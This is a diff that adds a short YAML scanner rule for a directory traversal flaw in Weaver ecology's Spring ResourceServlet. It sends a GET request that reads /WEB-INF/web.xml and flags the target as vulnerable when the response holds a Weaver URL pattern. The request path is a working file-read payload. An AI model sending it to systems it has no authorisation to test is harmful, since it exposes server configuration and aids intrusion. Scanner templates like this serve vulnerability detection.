@@ -1,0 +1,11 @@
+cve-id: ecology-springframework-directorytraversal
+rules:
+  - method: GET
+    path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"<url-pattern>/weaver/")
+severity:
+  medium
+type: 
+  directorytraversal
